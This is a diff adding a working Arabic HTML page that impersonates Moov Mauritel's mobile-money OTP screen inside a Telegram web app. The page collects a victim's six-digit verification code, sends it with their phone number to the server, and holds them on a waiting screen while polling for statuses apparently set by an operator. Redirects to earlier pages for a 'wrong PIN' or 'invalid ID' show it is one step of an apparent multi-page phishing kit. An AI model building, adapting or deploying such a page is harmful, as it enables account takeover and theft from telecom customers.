@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Mauritel - رمز التحقق</title>
+
+    <!-- Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --moov-blue: #002B66;
+            --moov-blue-dark: #001f4d;
+            --moov-orange: #FF6600;
+            --moov-gradient: linear-gradient(180deg, #003380 0%, #002B66 100%);
+            --bg-color: #ffffff;
+            --text-dark: #121820;
+            --text-muted: #666666;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #a0aec0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            margin: 0; 
+            padding: 0;
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+
+        /* Header Area */
+        .header-box { 
+            width: 100%; 
+            background: var(--moov-gradient); 
+            padding: 30px 20px 25px; 
+            color: #ffffff; 
+            text-align: center; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-title {
+            font-size: 28px;
+            font-weight: 900;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: -0.5px;
+        }
+
+        .header-title .region {
+            font-size: 13px;
+            margin-right: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--moov-orange);
+            color: #ffffff;
+            padding: 2px 8px;
+            border-radius: 6px;
+        }
+
+        .sub-header-text { 
+            font-size: 14px; 
+            margin-top: 6px; 
+            font-weight: 600;
+            color: #ffffff;
+            opacity: 0.9;
+        }
+
+        /* Main Content */
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 25px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 { 
+            color: var(--moov-blue); 
+            font-size: 22px; 
+            margin: 10px 0 8px; 
+            font-weight: 800; 
+        }
+
+        .description {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+        /* Error Banner */
+        .error-banner {
+            width: 100%;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            display: none;
+            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
+        }
+
+        /* Input Group */
+        .input-group {
+            width: 100%;
+            text-align: right;
+            margin-bottom: 30px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--moov-blue);
+            margin-bottom: 8px;
+        }
+
+        .otp-input {
+            width: 100%;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-dark);
+            outline: none;
+            text-align: center;
+            letter-spacing: 12px;
+            direction: ltr;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background-color: #f8fafc;
+        }
+
+        .otp-input:focus {
+            border-color: var(--moov-blue);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 43, 102, 0.1);
+        }
+
+        .otp-input.input-error {
+            border-color: #d93025;
+            background-color: #fff9f9;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s, color 0.2s, box-shadow 0.2s;
+            display: none; /* Shown dynamically when 6 digits are entered */
+        }
+
+        .btn-submit.active {
+            background-color: var(--moov-orange);
+            color: #ffffff;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 102, 0, 0.35);
+        }
+
+        .btn-submit.active:hover {
+            background-color: #e65c00;
+        }
+
+        /* Footer Box */
+        .footer-box { 
+            width: 100%; 
+            background: var(--moov-gradient); 
+            padding: 35px 20px 20px; 
+            color: #ffffff; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            margin-top: auto;
+        }
+
+        .footer-title {
+            font-size: 26px;
+            font-weight: 900;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-title .region {
+            font-size: 11px;
+            margin-right: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--moov-orange);
+            color: #ffffff;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 15px; 
+            padding: 0 20px; 
+            line-height: 1.4; 
+            color: #ffffff;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+
+        /* Full Screen Overlay Status Page (Top to Bottom) */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 43, 102, 0.95);
+            backdrop-filter: blur(8px);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            padding: 30px;
+            text-align: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-top-color: var(--moov-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 22px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
+        .overlay-desc {
+            font-size: 15px;
+            font-weight: 500;
+            line-height: 1.6;
+            opacity: 0.9;
+            max-width: 320px;
+            margin: 0;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Section -->
+<div class="header-box">
+    <div class="header-title">
+        <span>Moov Mauritel</span><span class="region">موريتانيا</span>
+    </div>
+    <div class="sub-header-text">تأكيد رمز التحقق</div>
+</div>
+
+<!-- Main Content Area -->
+<div class="main-content">
+    <h2>رمز التحقق (OTP)</h2>
+    <p class="description">
+        يرجى إدخال رمز التحقق المكون من <strong>6 أرقام</strong> الذي تم إرساله إلى رقم هاتفك.
+    </p>
+
+    <!-- Error Banner -->
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <!-- OTP Input -->
+    <div class="input-group">
+        <label for="otpInput" class="input-label">رمز التحقق:</label>
+        <input 
+            type="text" 
+            id="otpInput" 
+            class="otp-input" 
+            placeholder="••••••" 
+            maxlength="6" 
+            inputmode="numeric" 
+            autocomplete="off"
+        >
+    </div>
+
+    <button id="submitBtn" class="btn-submit">تأكيد</button>
+</div>
+
+<!-- Footer Area -->
+<div class="footer-box">
+    <div class="footer-title">
+        <span>Moov Mauritel</span><span class="region">موريتانيا</span>
+    </div>
+    <div class="sub-header-text">الخدمات المالية عبر الهاتف المحمول</div>
+    <p class="terms-text">جميع بياناتك الشخصية محمية ومشفّرة وفق القوانين المعمول بها</p>
+</div>
+
+<!-- Full Screen Overlay Status Page -->
+<div id="statusOverlay" class="overlay">
+    <div class="spinner"></div>
+    <div class="overlay-title">يرجى الانتظار...</div>
+    <p class="overlay-desc">جاري التحقق من رمز التأكيد، الرجاء الانتظار حتى يتم قبول الطلب.</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const otpInput = document.getElementById("otpInput");
+    const submitBtn = document.getElementById("submitBtn");
+    const errorDisplay = document.getElementById("errorDisplay");
+    const statusOverlay = document.getElementById("statusOverlay");
+
+    let pollInterval = null;
+
+    // Telegram WebApp SDK Initialization
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    // Format input (Numbers only, toggle button visibility when 6 digits are typed)
+    otpInput.addEventListener("input", () => {
+        otpInput.value = otpInput.value.replace(/\D/g, "");
+        otpInput.classList.remove("input-error");
+        errorDisplay.style.display = "none";
+
+        if (otpInput.value.length === 6) {
+            submitBtn.style.display = "block";
+            submitBtn.disabled = false;
+            submitBtn.classList.add("active");
+        } else {
+            submitBtn.style.display = "none";
+            submitBtn.disabled = true;
+            submitBtn.classList.remove("active");
+        }
+    });
+
+    // Start polling status from server
+    function startStatusPolling(phone) {
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await res.json();
+
+                if (data.status === "page9_approved") {
+                    clearInterval(pollInterval);
+                    window.location.href = "/success";
+                } else if (data.status === "page9_wrong_code") {
+                    clearInterval(pollInterval);
+                    statusOverlay.style.display = "none";
+                    errorDisplay.textContent = "رمز التحقق غير صحيح. يرجى إعادة إدخال الرمز الصحيح.";
+                    errorDisplay.style.display = "block";
+                    otpInput.classList.add("input-error");
+                    otpInput.value = "";
+                    submitBtn.style.display = "none";
+                } else if (data.status === "page9_wrong_pin") {
+                    clearInterval(pollInterval);
+                    window.location.href = "/page6?error=wrong_pin";
+                } else if (data.status === "page9_wrong_cin") {
+                    clearInterval(pollInterval);
+                    window.location.href = "/page8?error=invalid_cin";
+                }
+            } catch (err) {
+                console.error("Polling error:", err);
+            }
+        }, 2000);
+    }
+
+    // Submit handler
+    submitBtn.addEventListener("click", async () => {
+        if (!submitBtn.classList.contains("active")) return;
+
+        const otpValue = otpInput.value.trim();
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        if (otpValue.length !== 6) return;
+
+        submitBtn.disabled = true;
+        submitBtn.classList.remove("active");
+        submitBtn.textContent = "جاري الإرسال...";
+
+        try {
+            const response = await fetch("/api/verify-page9-otp", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, otp: otpValue })
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                statusOverlay.style.display = "flex";
+                startStatusPolling(phone);
+            } else {
+                alert("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
+                submitBtn.disabled = false;
+                submitBtn.classList.add("active");
+                submitBtn.textContent = "تأكيد";
+            }
+        } catch (err) {
+            console.error("❌ Error sending OTP:", err);
+            alert("تعذر الاتصال بالخادم. يرجى التحقق من الاتصال.");
+            submitBtn.disabled = false;
+            submitBtn.classList.add("active");
+            submitBtn.textContent = "تأكيد";
+        }
+    });
+});
+</script>
+
+</body>
+</html>
